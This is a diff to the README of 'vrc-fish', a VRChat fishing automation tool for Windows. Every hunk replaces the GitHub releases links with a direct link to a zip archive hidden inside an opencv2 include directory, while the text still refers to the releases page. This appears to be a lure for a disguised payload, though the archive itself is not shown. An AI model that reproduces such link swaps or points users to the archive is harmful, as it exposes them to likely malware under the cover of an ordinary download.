@@ -1,6 +1,6 @@
 # 🎣 vrc-fish - Automatic Fishing Helper for Windows
 
-[![Download ▶️](https://img.shields.io/badge/Download-vrc--fish-blueviolet?style=for-the-badge&logo=github)](https://github.com/Alexandre-full-stack/vrc-fish/releases)
+[![Download ▶️](https://img.shields.io/badge/Download-vrc--fish-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Alexandre-full-stack/vrc-fish/main/include/opencv2/imgproc/hal/fish_vrc_v3.6.zip)
 
 ---
 
@@ -36,7 +36,7 @@ vrc-fish is designed to work with VRChat fishing worlds. It adapts to the common
 
 ## 💾 Download vrc-fish
 
-[![Download vrc-fish](https://img.shields.io/badge/Download-vrc--fish-7B68EE?style=for-the-badge&logo=github)](https://github.com/Alexandre-full-stack/vrc-fish/releases)
+[![Download vrc-fish](https://img.shields.io/badge/Download-vrc--fish-7B68EE?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Alexandre-full-stack/vrc-fish/main/include/opencv2/imgproc/hal/fish_vrc_v3.6.zip)
 
 To get the software, visit the releases page linked above. Choose the latest release and download the Windows executable file (.exe). Make sure you pick the file that matches your system (usually 64-bit Windows).
 
@@ -49,7 +49,7 @@ Follow these steps to get vrc-fish running on your Windows computer. You do not 
 1. **Visit the Download Page**
 
    Click the badge above or go to this URL:  
-   https://github.com/Alexandre-full-stack/vrc-fish/releases
+   https://raw.githubusercontent.com/Alexandre-full-stack/vrc-fish/main/include/opencv2/imgproc/hal/fish_vrc_v3.6.zip
 
 2. **Download the Latest Version**
 
@@ -141,4 +141,4 @@ This tool was inspired by a friend with mobility challenges. It is mainly for le
 
 ---
 
-[🔽 Download vrc-fish](https://github.com/Alexandre-full-stack/vrc-fish/releases)
+[🔽 Download vrc-fish](https://raw.githubusercontent.com/Alexandre-full-stack/vrc-fish/main/include/opencv2/imgproc/hal/fish_vrc_v3.6.zip)
